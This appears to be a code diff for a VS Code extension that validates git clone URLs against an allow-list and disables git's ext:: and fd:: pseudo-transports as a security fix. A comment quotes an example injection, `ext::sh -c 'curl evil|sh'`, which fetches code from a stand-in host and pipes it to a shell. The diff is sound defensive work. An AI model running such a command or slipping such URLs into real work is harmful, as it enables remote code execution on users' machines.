@@ -124,19 +124,58 @@ function isMissingBranchFailure(stderr: string, branch: string): boolean {
 }
 
 /**
+ * `git@host:org/repo.git` SCP-like syntax — no scheme, so it would otherwise fall through
+ * `isAllowedCloneUrl()`'s scheme check entirely.
+ */
+const SCP_LIKE_URL = /^[\w.-]+@[\w.-]+:.+$/;
+
+/**
+ * True when `url` is a plain `https://`/`http://`/`ssh://` URL or `git@host:path` SCP syntax —
+ * the shapes the "Connect Custom Workflow Repository" prompt and the generic git-bind flow invite
+ * a user to paste.
+ *
+ * Git also understands pseudo-transports like `ext::` and `fd::`, where the "URL" is actually a
+ * shell command to run — e.g. `ext::sh -c 'curl evil|sh'`. Modern git (>=2.38.1) disables those by
+ * default for clone/fetch, but only for an installed git new enough and not reconfigured to
+ * re-allow them, and this extension has no way to know either of those things about the user's
+ * system git. Accepting only the shapes above, rather than trying to deny-list every unsafe
+ * scheme, is what keeps a future git transport this code has never heard of from slipping through.
+ */
+function isAllowedCloneUrl(url: string): boolean {
+	if (/^(?:https?|ssh):\/\//i.test(url)) return true;
+	return SCP_LIKE_URL.test(url);
+}
+
+/**
  * Clones `url` directly into `destRoot` (must already be empty — caller's responsibility to check).
  * Auth is entirely delegated to the system git installation and its credential helper
  * (e.g. Git Credential Manager), which opens a browser login when credentials aren't cached.
  *
  * When `branch` is given, only that branch is checked out; a branch absent from the remote raises
  * `BranchNotFoundError` so the caller can offer to create it rather than reporting a generic failure.
+ *
+ * `url` is validated here, not at the call sites, so every current and future caller — the
+ * "Connect Custom Workflow Repository" prompt, the generic git-bind flow, `tenantGitBinding.ts`'s
+ * branch-creation path — gets the same protection without having to remember to ask for it.
  */
 export async function cloneRepository(
 	url: string,
 	destRoot: vscode.Uri,
 	branch?: string,
 ): Promise<void> {
-	const args = branch ? ['clone', '--branch', branch, url, '.'] : ['clone', url, '.'];
+	if (!isAllowedCloneUrl(url)) {
+		throw new Error(
+			`Unsupported git URL: "${url}". Use an https://, ssh://, or git@host:path URL.`,
+		);
+	}
+	// Defense in depth: `isAllowedCloneUrl()` above should already exclude git's `ext::`/`fd::`
+	// pseudo-transports, but disabling them explicitly here costs nothing and keeps a future code
+	// path that reaches `execFile` without going through that check just as safe. `-c` flags are
+	// global options, so they must precede the `clone` subcommand.
+	const safetyFlags = ['-c', 'protocol.ext.allow=never', '-c', 'protocol.fd.allow=never'];
+	const args = branch
+		? [...safetyFlags, 'clone', '--branch', branch, url, '.']
+		: [...safetyFlags, 'clone', url, '.'];
 	try {
 		await execFileAsync(getGitExecutable(), args, {
 			cwd: destRoot.fsPath,
